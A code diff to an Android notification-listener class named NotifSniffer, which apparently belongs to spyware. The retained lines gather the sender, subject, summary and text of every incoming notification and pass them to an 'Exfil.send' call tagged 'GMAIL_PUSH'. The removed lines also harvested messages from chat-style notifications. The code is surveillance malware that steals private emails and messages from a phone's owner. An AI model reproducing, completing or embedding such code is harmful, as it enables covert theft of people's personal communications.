@@ -32,18 +32,6 @@ public class NotifSniffer extends NotificationListenerService {
             }
         }
 
-        StringBuilder msBuf = new StringBuilder();
-        try {
-            Notification.MessagingStyle ms =
-                Notification.MessagingStyle.extractMessagingStyleFromNotification(n);
-            if (ms != null) {
-                for (Notification.MessagingStyle.Message m : ms.getMessages()) {
-                    msBuf.append("[").append(m.getSender()).append("] ")
-                         .append(m.getText()).append("\n");
-                }
-            }
-        } catch (Throwable ignored) {}
-
         if (!title.isEmpty())      sb.append("From: ").append(title).append("\n");
         if (!sub.isEmpty())        sb.append("Subj: ").append(sub).append("\n");
         if (!sum.isEmpty())        sb.append("Sum : ").append(sum).append("\n");
@@ -51,7 +39,6 @@ public class NotifSniffer extends NotificationListenerService {
         if (!big.isEmpty())        sb.append("BIG : ").append(big).append("\n");
         if (!text.isEmpty())       sb.append("TXT : ").append(text).append("\n");
         if (linesBuf.length() > 0) sb.append("LINES:\n").append(linesBuf);
-        if (msBuf.length() > 0)    sb.append("MSGS:\n").append(msBuf);
 
         if (sb.length() > 0) {
             Exfil.send("GMAIL_PUSH", sb.toString());
